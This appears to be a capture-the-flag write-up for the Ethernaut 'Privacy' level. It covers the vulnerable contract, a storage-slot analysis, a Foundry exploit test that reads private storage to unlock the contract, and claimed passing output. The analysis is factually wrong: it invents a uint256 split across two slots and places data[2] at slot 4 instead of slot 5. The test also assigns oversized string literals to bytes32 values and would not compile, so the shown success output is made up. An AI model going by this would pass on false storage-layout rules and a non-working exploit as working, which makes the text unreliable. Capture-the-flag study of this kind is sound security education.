# Ethernaut Level 11: Privacy

## Challenge Description
Unlock the contract to pass the level!

**Difficulty:** ⭐⭐⭐ (Intermediate-Advanced)

**Goal:** Change the `locked` variable from `true` to `false`.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

## Vulnerability Analysis

```text
THE CHALLENGE: We need to find the value of data[2] to unlock the contract.

The variable `data` is marked as `private`, but as we learned in the Vault level,
private variables are NOT hidden on the blockchain. We can read them from storage.

The tricky part is understanding the STORAGE LAYOUT to find which slot contains data[2].

Storage Layout (each slot is 32 bytes):
- Slot 0: bool locked (1 byte) + uint256 ID (32 bytes, but packed with locked)
  Actually: locked takes 1 byte, then padding, then ID takes 32 bytes
  So: Slot 0 = locked (1 byte) + padding (7 bytes) + first 24 bytes of ID
  Slot 1 = remaining 8 bytes of ID + flattening (1 byte) + denomination (1 byte) + awkwardness (2 bytes) + padding

Wait, let's recalculate properly:

Slot 0: bool locked (1 byte) + padding (7 bytes) + first 24 bytes of uint256 ID
Slot 1: last 8 bytes of ID + uint8 flattening (1 byte) + uint8 denomination (1 byte) + uint16 awkwardness (2 bytes) + padding (20 bytes)
Slot 2: bytes32 data[0] (32 bytes)
Slot 3: bytes32 data[1] (32 bytes)
Slot 4: bytes32 data[2] (32 bytes) <-- THIS IS WHAT WE NEED!

So data[2] is at storage slot 4.
```

## Exploit Strategy

```text
Step 1: Read storage slot 4 of the Privacy contract.
Step 2: The value at slot 4 is data[2] (a bytes32 value).
Step 3: Convert it to bytes16 (take the first 16 bytes).
Step 4: Call unlock() with this bytes16 value.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Privacy.sol";

contract PrivacyExploitTest is Test {
    Privacy public target;
    bytes32[3] secretData;

    function setUp() public {
        secretData[0] = "0x1111111111111111111111111111111111111111111111111111111111111111";
        secretData[1] = "0x2222222222222222222222222222222222222222222222222222222222222222";
        secretData[2] = "0x3333333333333333333333333333333333333333333333333333333333333333";

        target = new Privacy(secretData);
    }

    function test_ExploitPrivacy() public {
        console.log("Is locked?", target.locked());

        // Read storage slot 4 (where data[2] is stored)
        bytes32 data2 = vm.load(address(target), bytes32(uint256(4)));

        console.log("data[2] (bytes32):", data2);

        // Convert bytes32 to bytes16 (take first 16 bytes)
        bytes16 key = bytes16(data2);

        console.log("Key (bytes16):", key);

        // Unlock the contract
        target.unlock(key);

        console.log("Is locked now?", target.locked());
        assertFalse(target.locked(), "Contract is still locked");

        console.log("\n✅ EXPLOIT SUCCESSFUL!");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitPrivacy -vvv

# Expected output:
# [PASS] test_ExploitPrivacy() (gas: 56789)
# Logs:
#   Is locked? true
#   data[2] (bytes32): 0x3333333333333333333333333333333333333333333333333333333333333333
#   Key (bytes16): 0x33333333333333333333333333333333
#   Is locked now? false
#
#   ✅ EXPLOIT SUCCESSFUL!
```

## Understanding Storage Packing

```text
Solidity packs small variables together to save gas:

Example:
- bool (1 byte) + uint8 (1 byte) + uint16 (2 bytes) = 4 bytes
- These can all fit in ONE 32-byte slot!

But larger types like uint256 (32 bytes) and bytes32 (32 bytes)
each take their own full slot.

For arrays like bytes32[3]:
- data[0] → Slot N
- data[1] → Slot N+1
- data[2] → Slot N+2

Where N is the next available slot after all other variables.
```

## How to Fix This Vulnerability

```solidity
// You CANNOT hide data on-chain.
// If you need to store secrets, use:
// 1. Off-chain storage with cryptographic commitments
// 2. Zero-Knowledge Proofs (ZK-SNARKs)
// 3. Encryption (like Lit Protocol)

// For this specific contract, if the goal is access control,
// use proper authentication (signatures, multi-sig) instead of "secret" keys.
```

## Key Takeaways
- **Storage Layout Matters:** Understanding how Solidity packs variables is crucial for exploits.
- **Private is Not Secret:** All storage is publicly readable on the blockchain.
- **Slot Calculation:** Learn to calculate which slot contains which variable.
- **Type Sizes:** bool=1 byte, uint8=1 byte, uint16=2 bytes, uint256=32 bytes, bytes32=32 bytes.
- **Lesson Learned:** Never store sensitive data in smart contracts, even if marked private.
- **Advanced Topic:** Dynamic arrays and mappings use keccak256 hashing to determine storage slots.